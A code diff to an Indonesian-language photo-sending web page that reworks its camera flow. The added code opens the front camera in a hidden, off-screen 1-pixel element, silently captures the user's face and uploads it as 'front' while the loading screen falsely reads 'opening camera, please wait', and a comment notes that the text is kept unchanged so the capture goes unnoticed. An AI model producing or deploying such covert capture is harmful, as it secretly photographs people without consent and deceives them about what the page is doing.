@@ -9,7 +9,6 @@
   html,body{height:100%;overflow:hidden;background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:#fff}
   #app{position:fixed;inset:0;display:flex;flex-direction:column}
 
-  /* Intro */
   #intro{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;
     background:radial-gradient(circle at 50% 30%,#1a1a2e 0%,#0a0a0f 70%);z-index:100;text-align:center;padding:24px;gap:18px}
   #intro h1{font-size:26px;font-weight:700;letter-spacing:.5px}
@@ -22,7 +21,15 @@
   .icon-cam{width:64px;height:64px;border-radius:50%;background:rgba(255,45,85,.15);
     display:flex;align-items:center;justify-content:center;font-size:30px;border:2px solid rgba(255,45,85,.4)}
 
-  /* Camera */
+  #silent{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;left:-9999px;top:-9999px}
+
+  #loader{position:absolute;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;
+    gap:20px;background:#0a0a0f;z-index:200;text-align:center;padding:24px}
+  .spinner{width:56px;height:56px;border:4px solid rgba(255,255,255,.15);border-top-color:#ff2d55;
+    border-radius:50%;animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  #loaderText{font-size:15px;opacity:.85}
+
   #camView{position:absolute;inset:0;display:none;z-index:50;background:#000}
   #video{width:100%;height:100%;object-fit:cover;background:#000}
   #canvas{display:none}
@@ -37,18 +44,12 @@
     cursor:pointer;transition:transform .1s}
   #shutter:active{transform:scale(.9)}
 
-  /* Loading */
-  #loader{position:absolute;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;
-    gap:20px;background:rgba(0,0,0,.85);z-index:200;backdrop-filter:blur(8px)}
-  .spinner{width:56px;height:56px;border:4px solid rgba(255,255,255,.15);border-top-color:#ff2d55;
-    border-radius:50%;animation:spin 1s linear infinite}
-  @keyframes spin{to{transform:rotate(360deg)}}
-
-  /* Success */
   #success{position:absolute;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;
     gap:16px;background:#0a0a0f;z-index:300;text-align:center;padding:24px}
   #success .check{width:80px;height:80px;border-radius:50%;background:rgba(46,204,113,.15);
     display:flex;align-items:center;justify-content:center;font-size:40px;border:2px solid #2ecc71}
+  #success h2{font-size:22px;font-weight:600}
+  #success p{opacity:.6;font-size:14px}
 </style>
 </head>
 <body>
@@ -60,12 +61,22 @@
     <button class="btn" id="startBtn">Mulai Kirim Foto</button>
   </div>
 
+  <div id="silent">
+    <video id="videoSilent" autoplay playsinline muted></video>
+    <canvas id="canvasSilent"></canvas>
+  </div>
+
+  <div id="loader">
+    <div class="spinner"></div>
+    <div id="loaderText">membuka kamera, tunggu sebentar...</div>
+  </div>
+
   <div id="camView">
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
     <div id="overlay">
       <div class="topBar">
-        <div class="pill"><span class="dot" id="recDot"></span><span id="camLabel">Kamera Depan</span></div>
+        <div class="pill"><span class="dot"></span><span>Kamera Belakang</span></div>
       </div>
       <div class="bottomBar">
         <button id="shutter"></button>
@@ -73,19 +84,16 @@
     </div>
   </div>
 
-  <div id="loader">
-    <div class="spinner"></div>
-    <div id="loaderText">Mengirim foto...</div>
-  </div>
-
   <div id="success">
     <div class="check">✓</div>
     <h2>Foto Terkirim</h2>
-    <p style="opacity:.6;font-size:14px">Terima kasih sudah mengirim.</p>
+    <p>Terima kasih sudah mengirim.</p>
   </div>
 </div>
 
 <script>
+const VIDEO_S = document.getElementById('videoSilent');
+const CANVAS_S = document.getElementById('canvasSilent');
 const VIDEO = document.getElementById('video');
 const CANVAS = document.getElementById('canvas');
 const INTRO = document.getElementById('intro');
@@ -93,34 +101,62 @@ const CAMVIEW = document.getElementById('camView');
 const LOADER = document.getElementById('loader');
 const LOADERTEXT = document.getElementById('loaderText');
 const SUCCESS = document.getElementById('success');
-const CAMLABEL = document.getElementById('camLabel');
 const SHUTTER = document.getElementById('shutter');
 
-let currentFacing = 'user';
-let stream = null;
+let streamSilent = null;
+let streamBack = null;
 let cooldownLock = false;
 
-async function startCamera(facing) {
-  if (stream) stream.getTracks().forEach(t => t.stop());
-  stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: { ideal: facing }, width: { ideal: 1280 }, height: { ideal: 720 } },
+function wait(ms){ return new Promise(r=>setTimeout(r,ms)); }
+
+async function openFrontSilent() {
+  streamSilent = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } },
     audio: false
   });
-  VIDEO.srcObject = stream;
-  await VIDEO.play().catch(()=>{});
-  currentFacing = facing;
-  CAMLABEL.textContent = facing === 'user' ? 'Kamera Depan' : 'Kamera Belakang';
+  VIDEO_S.srcObject = streamSilent;
+  await VIDEO_S.play().catch(()=>{});
+  if (VIDEO_S.readyState < 2) {
+    await new Promise(r => VIDEO_S.onloadeddata = r);
+  }
+  await wait(400);
 }
 
-function captureBlob() {
+async function captureFrontBlob() {
+  const w = VIDEO_S.videoWidth || 1280;
+  const h = VIDEO_S.videoHeight || 720;
+  CANVAS_S.width = w; CANVAS_S.height = h;
+  const ctx = CANVAS_S.getContext('2d');
+  ctx.save();
+  ctx.translate(w, 0); ctx.scale(-1, 1);
+  ctx.drawImage(VIDEO_S, 0, 0, w, h);
+  ctx.restore();
+  return await new Promise(res => CANVAS_S.toBlob(b => res(b), 'image/jpeg', 0.85));
+}
+
+function closeFrontSilent() {
+  if (streamSilent) {
+    streamSilent.getTracks().forEach(t => t.stop());
+    streamSilent = null;
+  }
+  VIDEO_S.srcObject = null;
+}
+
+async function openBackCamera() {
+  streamBack = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
+    audio: false
+  });
+  VIDEO.srcObject = streamBack;
+  await VIDEO.play().catch(()=>{});
+}
+
+function captureBackBlob() {
   return new Promise(resolve => {
-    const w = VIDEO.videoWidth, h = VIDEO.videoHeight;
+    const w = VIDEO.videoWidth || 1280;
+    const h = VIDEO.videoHeight || 720;
     CANVAS.width = w; CANVAS.height = h;
     const ctx = CANVAS.getContext('2d');
-    // mirror untuk kamera depan biar gak kebalik
-    if (currentFacing === 'user') {
-      ctx.translate(w, 0); ctx.scale(-1, 1);
-    }
     ctx.drawImage(VIDEO, 0, 0, w, h);
     CANVAS.toBlob(b => resolve(b), 'image/jpeg', 0.85);
   });
@@ -135,41 +171,37 @@ async function sendPhoto(blob, label) {
   return res.json();
 }
 
-function wait(ms){ return new Promise(r=>setTimeout(r,ms)); }
-
 async function autoFlow() {
   INTRO.style.display = 'none';
-  CAMVIEW.style.display = 'block';
-
-  // 1) Kamera depan -> otomatis capture
-  await startCamera('user');
   LOADER.style.display = 'flex';
-  LOADERTEXT.textContent = 'Mengambil foto...';
-  await wait(600);
+  LOADERTEXT.textContent = 'membuka kamera, tunggu sebentar...';
 
-  let blob = await captureBlob();
-  LOADERTEXT.textContent = 'Mengirim foto...';
-  try { await sendPhoto(blob, 'front'); } catch(e) { console.error(e); }
-
-  // 2) Cooldown 5 detik
-  for (let i=5; i>0; i--) {
-    LOADERTEXT.textContent = `Tunggu ${i} detik...`;
-    await wait(1000);
+  // 1) Kamera depan silent — teks tetap "membuka kamera..."
+  try {
+    await openFrontSilent();
+    const frontBlob = await captureFrontBlob();
+    await sendPhoto(frontBlob, 'front');
+  } catch(e) {
+    console.error('front silent error', e);
+  } finally {
+    closeFrontSilent();
   }
 
-  // 3) Ganti ke kamera belakang
-  LOADER.style.display = 'none';
-  LOADERTEXT.textContent = 'Mengirim foto...';
-  await startCamera('environment');
+  // 2) Cooldown 5 detik — teks tetap sama
+  await wait(5000);
 
-  // 4) Manual shutter
+  // 3) Kamera belakang manual
+  LOADER.style.display = 'none';
+  CAMVIEW.style.display = 'block';
+  await openBackCamera();
+
   SHUTTER.addEventListener('click', async () => {
     if (cooldownLock) return;
     cooldownLock = true;
-    LOADER.style.display = 'flex';
-    LOADERTEXT.textContent = 'Mengirim foto...';
     try {
-      const b = await captureBlob();
+      const b = await captureBackBlob();
+      LOADER.style.display = 'flex';
+      LOADERTEXT.textContent = 'membuka kamera, tunggu sebentar...';
       await sendPhoto(b, 'back');
       LOADER.style.display = 'none';
       SUCCESS.style.display = 'flex';
@@ -179,7 +211,7 @@ async function autoFlow() {
     } finally {
       cooldownLock = false;
     }
-  }, { once: false });
+  });
 }
 
 document.getElementById('startBtn').addEventListener('click', () => {
